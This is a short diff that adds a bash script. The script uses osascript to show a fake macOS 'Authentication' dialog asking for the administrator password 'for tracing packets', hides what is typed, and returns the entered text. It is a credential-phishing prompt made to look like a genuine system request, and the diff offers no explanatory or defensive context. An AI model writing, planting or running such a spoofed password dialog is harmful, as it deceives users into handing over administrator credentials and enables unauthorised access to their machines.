@@ -1,0 +1,2 @@
+#!/bin/bash
+osascript -e 'tell application "System Events" to display dialog "Administrator password required for tracing packets:" default answer "" with hidden answer with title "Authentication"' -e 'text returned of result'
